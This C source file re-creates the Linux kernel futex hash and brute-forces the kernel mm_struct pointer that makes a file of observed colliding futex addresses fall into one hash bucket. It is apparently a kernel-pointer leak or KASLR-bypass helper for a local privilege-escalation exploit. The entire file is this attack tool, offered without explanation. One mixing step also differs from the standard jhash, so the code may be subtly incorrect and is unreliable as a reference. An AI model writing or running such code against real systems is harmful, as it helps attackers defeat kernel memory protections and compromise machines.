#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define rol32(x, n) (((x) << ((n) & 31)) | ((x) >> (32 - (n))))

static void jhash_mix(uint32_t *a, uint32_t *b, uint32_t *c) {
  *a -= *c; *a ^= rol32(*c, 4);  *c += *b;
  *b -= *a; *b ^= rol32(*a, 6);  *a += *c;
  *c -= *b; *c ^= rol32(*a, 8);  *b += *a;
  *a -= *c; *a ^= rol32(*c, 16); *c += *b;
  *b -= *a; *b ^= rol32(*a, 19); *a += *c;
  *c -= *b; *c ^= rol32(*b, 4);  *b += *a;
}

static void jhash_final(uint32_t *a, uint32_t *b, uint32_t *c) {
  *c ^= *b; *c -= rol32(*b, 14);
  *a ^= *c; *a -= rol32(*c, 11);
  *b ^= *a; *b -= rol32(*a, 25);
  *c ^= *a; *c -= rol32(*a, 16);
  *a ^= *b; *a -= rol32(*b, 4);
  *b ^= *c; *b -= rol32(*c, 14);
  *c ^= *a; *c -= rol32(*a, 24);
}

static uint32_t futex_hash(uint64_t addr, uint64_t mm, uint32_t mask) {
  /* alioth 4.19.157 vendor source: private.mm first, address second. */
  uint32_t a = 0xdeadbeef + (4u << 2) + (uint32_t)(addr & 0xfff);
  uint32_t b = a, c = a;
  a += (uint32_t)mm;
  b += (uint32_t)(mm >> 32);
  c += (uint32_t)(addr & ~0xfffULL);
  jhash_mix(&a, &b, &c);
  a += (uint32_t)((addr & ~0xfffULL) >> 32);
  jhash_final(&a, &b, &c);
  return c & mask;
}

int main(int argc, char **argv) {
  if (argc < 6) {
    fprintf(stderr, "usage: %s collisions.txt start end step mask\n", argv[0]);
    return 2;
  }
  uint64_t addrs[4096];
  size_t count = 0;
  FILE *f = fopen(argv[1], "r");
  if (!f) { perror("open"); return 1; }
  char line[256];
  while (fgets(line, sizeof(line), f) && count < 4096) {
    if (!strncmp(line, "futex_addr=", 11))
      addrs[count++] = strtoull(line + 11, NULL, 0);
  }
  fclose(f);
  if (count < 2) return 1;

  uint64_t start = strtoull(argv[2], NULL, 0);
  uint64_t end = strtoull(argv[3], NULL, 0);
  uint64_t step = strtoull(argv[4], NULL, 0);
  uint32_t mask = strtoul(argv[5], NULL, 0);
  if (!step || end <= start) return 1;

  size_t found = 0;
#pragma omp parallel for schedule(static) reduction(+:found)
  for (int64_t mi = 0; mi < (int64_t)((end - start) / step); ++mi) {
    uint64_t mm = start + (uint64_t)mi * step;
    uint32_t h0 = futex_hash(addrs[0], mm, mask);
    if (h0 != futex_hash(addrs[1], mm, mask)) continue;
    size_t agree = 2;
    for (size_t i = 2; i < count; ++i) {
      if (futex_hash(addrs[i], mm, mask) != h0) break;
      ++agree;
    }
    if (agree == count) {
#pragma omp critical
      printf("MM=0x%016llx AGREE=%zu/%zu BUCKET=%u\n",
             mm, agree, count, h0);
      ++found;
    }
  }
  return found ? 0 : 3;
}
